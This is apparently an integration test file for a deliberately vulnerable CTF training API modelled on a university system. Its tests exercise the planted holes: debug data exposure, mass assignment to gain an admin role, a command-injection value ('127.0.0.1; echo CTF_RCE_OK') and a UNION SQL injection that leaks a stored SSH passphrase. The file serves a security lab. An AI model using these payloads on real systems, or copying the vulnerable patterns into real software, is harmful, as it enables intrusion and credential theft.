import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { PrismaClient } from '@prisma/client';
import { createApp } from '../../src/app';

const prisma = new PrismaClient();
let server: http.Server;
let baseUrl = '';

async function requestJson(
  path: string,
  options: { method?: string; headers?: Record<string, string>; body?: unknown } = {}
) {
  const res = await fetch(`${baseUrl}${path}`, {
    method: options.method || 'GET',
    headers: {
      'Content-Type': 'application/json',
      ...(options.headers || {})
    },
    body: options.body ? JSON.stringify(options.body) : undefined
  });
  const data = await res.json();
  return { status: res.status, headers: res.headers, data: data as any };
}

describe('Testes de Integração — API REST + PostgreSQL + Fluxos do CTF (api.integration.test.ts)', () => {
  before(async () => {
    // Garante que o usuário 104 comece com role="user" antes da bateria de testes
    await prisma.staff.updateMany({
      where: { id: 104 },
      data: { role: 'user', theme: 'light' }
    });

    const app = createApp();
    await new Promise<void>((resolve) => {
      server = app.listen(0, '127.0.0.1', () => {
        const addr = server.address();
        if (addr && typeof addr === 'object') {
          baseUrl = `http://127.0.0.1:${addr.port}`;
        }
        resolve();
      });
    });
  });

  after(async () => {
    // Restaura estado original do banco após os testes para não deixar o usuário 104 como admin
    await prisma.staff.updateMany({
      where: { id: 104 },
      data: { role: 'user', theme: 'light' }
    });
    await prisma.$disconnect();
    await new Promise<void>((resolve) => server.close(() => resolve()));
  });

  it('1. [GET /api/v1/status] Deve retornar status operacional da API e header X-Powered-By customizado', async () => {
    const { status, headers, data } = await requestJson('/api/v1/status');
    assert.equal(status, 200);
    assert.equal(data.gateway_status, 'active');
    assert.match(headers.get('x-powered-by') || '', /SIGAA-Next-API/);
  });

  it('2. [GET /api/v1/staff] Deve listar servidores e expor _debug_internal (Vuln #1: Excessive Data Exposure)', async () => {
    const { status, data } = await requestJson('/api/v1/staff');
    assert.equal(status, 200);
    assert.equal(data.total, 4);

    const estagiario = data.data.find((m: any) => m.id === 104);
    assert.ok(estagiario);
    assert.equal(estagiario._debug_internal.login_linux, 'estagiario_sti');
    assert.equal(estagiario._debug_internal.draft_endpoint, '/api/v1/users/104/drafts');

    const dba = data.data.find((m: any) => m.id === 105);
    assert.ok(dba);
    assert.equal(dba.visivel_front, false);
    assert.match(dba._debug_internal.nota_privada, /query raw concatenada/);
  });

  it('3. [GET /api/v1/users/:id/drafts] Deve retornar rascunho para ID 104 e 404 para outros IDs', async () => {
    const okRes = await requestJson('/api/v1/users/104/drafts');
    assert.equal(okRes.status, 200);
    assert.ok(Array.isArray(okRes.data.todo_notes));

    const notFoundRes = await requestJson('/api/v1/users/999/drafts');
    assert.equal(notFoundRes.status, 404);
  });

  it('4. [POST /api/v1/admin/system-check] Deve bloquear acesso sem Header X-Origin-System (401) e sem role=admin (403)', async () => {
    // Sem header X-Origin-System
    const noHeader = await requestJson('/api/v1/admin/system-check', {
      method: 'POST',
      body: {}
    });
    assert.equal(noHeader.status, 401);

    // Com header X-Origin-System: SGI-v2, mas ainda com role="user"
    const forbidden = await requestJson('/api/v1/admin/system-check', {
      method: 'POST',
      headers: { 'X-Origin-System': 'SGI-v2' },
      body: {}
    });
    assert.equal(forbidden.status, 403);
    assert.equal(forbidden.data.required_role, 'admin');
  });

  it('5. [PUT /api/v1/profile -> POST /api/v1/admin/system-check] Caminho A: Deve permitir Mass Assignment para admin e liberar o cofre SSH', async () => {
    // Explora Mass Assignment injetando "role": "admin"
    const profileRes = await requestJson('/api/v1/profile', {
      method: 'PUT',
      body: { theme: 'dark', role: 'admin' }
    });

    assert.equal(profileRes.status, 200);
    assert.equal(profileRes.data.session.role, 'admin');
    assert.ok(profileRes.data.token);

    // Acessa endpoint administrativo com o Token JWT + Header SGI-v2
    const adminRes = await requestJson('/api/v1/admin/system-check', {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${profileRes.data.token}`,
        'X-Origin-System': 'SGI-v2'
      },
      body: { target_host: '127.0.0.1; echo CTF_RCE_OK' }
    });

    assert.equal(adminRes.status, 200);
    assert.equal(adminRes.data.ssh_maintenance_credentials.ssh_user, 'estagiario_sti');

    const passphraseRecord = adminRes.data.ssh_maintenance_credentials.vault_records.find(
      (r: any) => r.service === 'ssh_key_passphrase_estagiario'
    );
    assert.ok(passphraseRecord);
    assert.equal(passphraseRecord.secret, 'UnB_ST1_H0m0l0g_2026!#');
    assert.match(adminRes.data.network_diagnostic_output, /CTF_RCE_OK/);
  });

  it('6. [GET /api/v1/courses/search] Caminho B: Deve filtrar disciplinas normalmente e permitir UNION SQL Injection no PostgreSQL', async () => {
    // Busca normal
    const normalRes = await requestJson('/api/v1/courses/search?dept=CIC');
    assert.equal(normalRes.status, 200);
    assert.equal(normalRes.data.results.length, 2);

    // Exploração SQL Injection extraindo sys_maintenance_vault
    const sqliPayload = encodeURIComponent(
      "CIC' UNION SELECT id, service_name, username, secret_value, description, '2026.2', 1 FROM sys_maintenance_vault--"
    );
    const sqliRes = await requestJson(`/api/v1/courses/search?dept=${sqliPayload}`);
    assert.equal(sqliRes.status, 200);

    const leakedPassphrase = sqliRes.data.results.find(
      (row: any) => row.codigo === 'ssh_key_passphrase_estagiario'
    );
    assert.ok(leakedPassphrase);
    assert.equal(leakedPassphrase.departamento, 'UnB_ST1_H0m0l0g_2026!#');
  });

  it('7. [POST /api/v1/auth/legacy-login] Deve retornar 403 no Rabbit Hole de credenciais antigas', async () => {
    const rhRes = await requestJson('/api/v1/auth/legacy-login', {
      method: 'POST',
      body: { username: 'admin_v1_deprecated', password: '123' }
    });
    assert.equal(rhRes.status, 403);
  });
});
